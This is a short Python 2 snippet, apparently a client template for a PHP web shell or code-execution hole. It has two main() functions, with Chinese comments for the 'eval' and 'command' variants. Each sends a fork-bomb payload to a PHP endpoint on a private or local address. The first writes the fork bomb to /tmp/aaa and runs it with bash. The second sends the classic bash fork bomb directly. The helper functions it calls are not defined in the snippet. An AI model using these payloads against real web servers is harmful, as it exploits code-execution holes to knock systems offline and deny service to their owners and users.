#eval型
def main():
	host = "192.168.50.57"
	port = "80"
	url  = "http://%s:%s/code.php" % (host, port)
	code = "system(\"echo '.(){.|.&} && .' > /tmp/aaa\");system(\"/bin/bash /tmp/aaa\");echo \"seems good!\";"
	print code_exec(url, code)
#命令型
def main():
	host = "127.0.0.1"
	port = "80"
	url = "http://%s:%s/c.php" % (host, port)
	command = ":(){:|:&};:"
	shell_exe(url,command)